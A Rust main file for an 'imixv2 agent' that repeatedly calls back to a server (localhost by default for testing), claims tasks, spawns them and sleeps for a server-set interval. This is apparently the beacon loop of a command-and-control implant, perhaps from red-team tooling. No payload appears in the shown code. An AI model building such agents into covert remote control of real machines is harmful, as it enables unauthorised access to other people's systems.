extern crate alloc;

use anyhow::{Context, Result};
use std::sync::Arc;
use std::time::Duration;
use tokio::time::sleep;

use crate::agent::ImixAgent;
use crate::task::TaskRegistry;
pub use pb::config::Config;
pub use transport::{ActiveTransport, Transport};

mod agent;
mod task;
mod version;
use crate::version::VERSION;

#[tokio::main]
async fn main() -> Result<()> {
    pretty_env_logger::init();
    log::info!("Starting imixv2 agent");

    // Load config / defaults
    let mut config = Config::default_with_imix_verison(VERSION);
    config.callback_uri = "http://localhost:8000".to_string(); // Default for testing
                                                               // Note: IMIX_SERVER_PUBKEY is handled by pb crate env var or default

    let transport = ActiveTransport::new(config.callback_uri.clone(), None)
        .context("Failed to initialize transport")?;

    let agent = Arc::new(ImixAgent::new(config, transport));

    loop {
        match agent.fetch_tasks().await {
            Ok(tasks) => {
                if tasks.is_empty() {
                    log::info!("Callback success, no tasks to claim")
                }
                for task in tasks {
                    log::info!("Claimed task: {}", task.id);
                    TaskRegistry::spawn(task, agent.clone());
                }
            }
            Err(e) => {
                log::error!("Callback failed: {e:#}");
            }
        }

        let interval = agent.get_callback_interval_u64();
        sleep(Duration::from_secs(interval)).await;
    }
}
